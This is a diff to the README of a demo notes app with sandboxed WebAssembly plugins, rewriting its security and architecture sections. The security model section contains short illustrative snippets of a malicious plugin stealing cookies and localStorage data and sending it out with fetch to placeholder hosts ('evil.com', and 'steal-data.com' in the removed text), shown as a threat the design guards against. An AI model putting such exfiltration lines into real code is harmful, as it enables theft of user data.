@@ -6,49 +6,84 @@ A demonstration of WebAssembly-powered plugin architecture in web applications. 
 
 ## 🎯 Overview
 
-WASM Notes is a simple but powerful notes application that uses **WebAssembly plugins** to add features. Unlike traditional JavaScript plugins, WASM plugins:
+WASM Notes is a simple but powerful notes application that uses **WebAssembly plugins** to add features. This project demonstrates a **production-grade secure plugin architecture** using the VS Code Extension Host pattern.
 
-- ✨ Are compiled from languages like Rust, Go, or C++
-- 🔒 Run in a secure sandbox with no direct DOM access
-- ⚡ Provide near-native performance
-- 🎯 Have predictable memory usage
+**Key Security Features:**
+- 🔒 **Web Worker Isolation** - Plugins run in separate threads with no DOM access
+- 🚫 **No Storage Access** - Plugins cannot read localStorage, cookies, or tokens
+- 🛡️ **Sandboxed Execution** - Plugins can only communicate via message passing
+- ✅ **VS Code Pattern** - Same architecture as VS Code Web Extensions
+
+**Plugin Benefits:**
+- ✨ Compiled from languages like Rust, Go, or C++
+- ⚡ Near-native performance
+- 🎯 Predictable memory usage
 - 🌍 Work across any JavaScript runtime (browser, Node.js, Deno)
 
 ## 🏗️ Architecture
 
+### Secure Extension Host Pattern (VS Code-style)
+
 ```
-┌─────────────────────────────────────────────────────────┐
-│                     Web Application                      │
-│                    (Astro + JavaScript)                   │
-│                                                           │
-│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐     │
-│  │  Plugin API │  │  Plugin API │  │  Plugin API │     │
-│  │   Markdown  │  │ Word Counter│  │Tag Manager  │     │
-│  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘     │
-│         │                 │                 │            │
-└─────────┼─────────────────┼─────────────────┼────────────┘
-          │                 │                 │
-          ▼                 ▼                 ▼
-    ┌─────────┐       ┌─────────┐       ┌─────────┐
-    │  WASM   │       │  WASM   │       │  WASM   │
-    │ Module  │       │ Module  │       │ Module  │
-    │ (Rust)  │       │ (Rust)  │       │ (Rust)  │
-    └─────────┘       └─────────┘       └─────────┘
+┌──────────────────────────────────────────────────┐
+│           Main Thread (UI/Browser)               │
+│                                                  │
+│  ┌────────────────────────────────────────┐    │
+│  │         React Notes App                 │    │
+│  │  - Editor UI, Note Management           │    │
+│  │  - Plugin Manager UI                    │    │
+│  └────────────┬───────────────────────────┘    │
+│               │ postMessage (data only)         │
+└───────────────┼─────────────────────────────────┘
+                │
+┌───────────────▼─────────────────────────────────┐
+│      Extension Host (Web Worker Thread)         │
+│                                                  │
+│  ┌─────────┐  ┌─────────┐  ┌─────────┐        │
+│  │  WASM   │  │  WASM   │  │  WASM   │        │
+│  │Markdown │  │ Counter │  │  Tags   │        │
+│  │ Plugin  │  │ Plugin  │  │ Plugin  │        │
+│  └─────────┘  └─────────┘  └─────────┘        │
+│                                                  │
+│  ❌ No DOM Access                               │
+│  ❌ No localStorage/cookies                     │
+│  ❌ No direct network access                    │
+│  ✅ Only message passing to main thread         │
+└──────────────────────────────────────────────────┘
 ```
 
 ### Communication Flow
 
-1. **Host → Plugin**: JavaScript passes string data to WASM functions
-2. **Plugin Processing**: Rust code processes the data
-3. **Plugin → Host**: Returns processed data (strings, numbers, or JSON)
+1. **Main Thread → Worker**: Send plugin method call via `postMessage`
+   ```javascript
+   pluginLoader.callPlugin('markdown-plugin', 'render', text)
+   ```
 
-### Plugin Isolation
+2. **Worker**: Load and execute WASM plugin in isolated environment
+   ```javascript
+   const module = await import(pluginUrl);
+   const result = module.render(text);
+   ```
 
-Each WASM plugin:
-- Cannot access other plugins' memory
-- Cannot directly manipulate the DOM
-- Cannot make network requests (unless explicitly given permission)
-- Has its own linear memory space
+3. **Worker → Main Thread**: Return result via `postMessage`
+   ```javascript
+   self.postMessage({ result });
+   ```
+
+### Security Guarantees
+
+**Plugins execute in Web Workers and CANNOT:**
+- ❌ Access `window`, `document`, or any DOM APIs
+- ❌ Read `localStorage`, `sessionStorage`, or cookies
+- ❌ Make arbitrary `fetch()` requests (blocked by CSP)
+- ❌ Access user data from the main thread
+- ❌ Execute code in the main thread context
+
+**Plugins CAN ONLY:**
+- ✅ Process data passed via message passing
+- ✅ Perform computations on input text
+- ✅ Return results to the main thread
+- ✅ Use WASM's built-in memory safety
 
 ## 🔌 Plugins
 
@@ -252,19 +287,6 @@ const result = plugin.process('hello world');
 - Clear error messages
 - Comprehensive documentation
 
-## 🔐 Security Considerations
-
-### WASM Sandbox
-- No direct system access
-- No DOM manipulation
-- No network access
-- Controlled memory limits
-
-### Best Practices
-- Validate all plugin outputs
-- Sanitize HTML from plugins
-- Set memory limits per plugin
-- Implement plugin signing (future)
 
 ## 🚢 Deployment
 
@@ -289,31 +311,43 @@ Enable GitHub Pages in repository settings:
 - [Astro Documentation](https://docs.astro.build/)
 - [pulldown-cmark](https://github.com/raphlinus/pulldown-cmark)
 
-## 🤔 Why WASM for Plugins?
+## 🔒 Security Model
 
-### Traditional JS Plugins
+This project implements **production-grade plugin security** using the VS Code Extension Host pattern.
+
+### Why This Architecture?
+
+**Traditional JS Plugins (Insecure):**
 ```javascript
-// Can do anything:
-window.location = 'evil.com';
-localStorage.clear();
-fetch('steal-data.com', { body: secrets });
+// Malicious plugin can do ANYTHING:
+document.cookie;              // ❌ Steal auth tokens
+localStorage.getItem('data'); // ❌ Access user data
+fetch('evil.com', { body }); // ❌ Exfiltrate data
 ```
 
-### WASM Plugins
-```rust
-// Can only do what you allow:
-#[wasm_bindgen]
-pub fn process(text: &str) -> String {
-    // Sandboxed, no side effects
-    text.to_uppercase()
-}
+**Our Architecture (Secure):**
+```javascript
+// Plugins run in Web Worker:
+document.cookie;              // ✅ ReferenceError: document is not defined
+localStorage.getItem('data'); // ✅ ReferenceError: localStorage is not defined
+fetch('evil.com');            // ✅ Blocked by CSP
 ```
 
-### Benefits
-- **Security**: Plugins can't access your app's internals
+### Defense in Depth
+
+1. **Web Worker Isolation** - Separate thread, no DOM/storage access
+2. **Message Passing Only** - Structured clone, no shared memory
+3. **WASM Sandboxing** - Memory-safe, can't escape linear memory
+4. **Content Security Policy** - Blocks unauthorized network requests
+
+### Why WASM + Workers?
+
+- **Security**: Double sandboxing (Worker + WASM)
 - **Performance**: Near-native speed for heavy computations
 - **Reliability**: No runtime errors from plugin conflicts
-- **Portability**: Same plugins work in browser, Node.js, edge
+- **Portability**: Same architecture works everywhere
+
+**See [SECURITY.md](./SECURITY.md) for detailed security analysis.**
 
 ## 🎯 Use Cases
 
